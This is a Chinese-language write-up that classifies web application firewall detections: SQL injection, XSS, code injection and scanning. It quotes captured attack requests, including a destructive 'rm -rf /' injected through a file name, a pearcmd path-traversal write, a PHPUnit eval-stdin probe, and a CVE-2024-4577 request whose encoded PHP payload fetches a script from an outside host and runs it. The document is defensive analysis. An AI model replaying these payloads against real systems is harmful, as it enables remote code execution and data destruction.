# WAF 拦截到的攻击行为分类
## SQL 注入
### 定义 ：
攻击者通过在 Web 应用程序的输入字段中插入恶意 SQL 代码，借助 Web 应用的数据库执行漏洞，获取、篡改或删除数据。
### 常见攻击方式 ：
#### 经典 SQL 注入 ：
在输入框中直接注入恶意 SQL 查询语句，如在登录页面的用户名或密码输入框中输入 “‘ OR ‘1’=‘1”，试图绕过登录验证。
#### 盲注 ：
攻击者无法看到 SQL 查询的具体错误信息，但通过反复提交请求并观察应用的响应变化，如响应时间、页面内容差异等，逐步推测数据库结构和数据。
#### 基于时间的盲注 ：
通过控制 SQL 查询的执行时间，根据页面响应时间的长短来间接获知数据库的内容。
## XSS 注入
### 定义 ：
攻击者将恶意脚本注入到 Web 页面中，当受害者访问该页面时，恶意脚本在用户的浏览器中执行，从而窃取用户敏感信息、劫持用户会话或在页面上展示欺诈性内容。
### 常见攻击类型 ：
#### 存储型 XSS ：
攻击者将恶意脚本存储在服务器端，如在留言板块、数据库中保存恶意脚本，当其他用户访问时，这些脚本会自动执行。
#### 反射型 XSS ：
攻击者通过构造包含恶意脚本的 URL 或请求参数，诱使受害者点击链接，恶意脚本随之被嵌入到请求中并执行。
#### 基于 DOM 的 XSS ：
利用客户端的 JavaScript 代码进行脚本注入，通过修改页面的 DOM 结构，使恶意脚本执行。
## 代码注入
### 定义 ：
攻击者向应用程序中插入恶意代码，使应用程序执行非预期的操作，常见的有命令注入、脚本注入等。
### 常见攻击方式 ：
##### 命令注入 ：
攻击者通过应用程序的输入点，如表单、查询参数等，注入操作系统命令，如果应用程序未对输入进行严格过滤和验证，就可能执行这些恶意命令，导致敏感信息泄露、系统受损等。
例如
文件名字段未过滤特殊字符，提交的payload包含，且后台处理时未做处理可能导致注入的命令被执行
```
test.jpg; rm -rf /
```

##### 脚本注入 ：
例如
```html
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1
Host: 182.140.209.42:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
```

```html
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 182.140.209.44:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 221

<?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
```

```
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 182.140.209.44:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
Content-Type: text/plain
Content-Length: 33

<?php echo(md5("Hello PHPUnit"));
```

## 扫描
#### 针对常见接口的扫描 ：
攻击者常对一些常见的 Web 接口进行扫描，如 wordpress 的 wp-admin、openapi 的 /openapi/、通用的 /admin/ /test/ /.env 等，以寻找可利用的漏洞或敏感信息。虽当前产品未使用，但此类扫描行为仍需关注，防止未来业务扩展后产生风险。
```
GET /openapi/v2 HTTP/1.1
user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
accept: application/json
accept-encoding: gzip, br, deflate
host: 182.140.209.44

```

```
GET /.env.bak HTTP/1.1
user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
accept: */*
accept-encoding: gzip, br, deflate
host: 182.140.209.44
```

#### 搜索引擎的蜘蛛或其他爬虫 ：
搜索引擎会主动请求 /robot.txt 以了解网站可爬取的范围，但部分扫描脚本也会利用该文件来获取网站信息，存在一定风险。鉴于当前产品无需搜索引擎爬取，可在 WAF 上配置拦截策略，禁止搜索引擎爬虫和恶意扫描脚本的访问，同时设置合理的访问频率限制，防止爬虫对服务器造成过大压力。
